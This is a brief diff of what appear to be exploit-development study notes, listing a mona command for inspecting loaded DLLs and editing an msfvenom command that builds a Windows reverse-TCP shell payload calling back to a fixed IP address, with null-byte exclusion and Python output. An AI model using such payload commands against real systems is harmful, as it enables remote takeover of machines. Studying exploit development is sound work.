@@ -88,4 +88,4 @@ in log data.  !mona modules  # list out all loadded dlls and protection
               
               copy clipboard address
               
-        msfvenom -p windows/shell/reverse_tcp lhost =10.50.25.239
+        msfvenom -p windows/shell/reverse_tcp lhost =10.50.25.239 -b "\x00" -f python
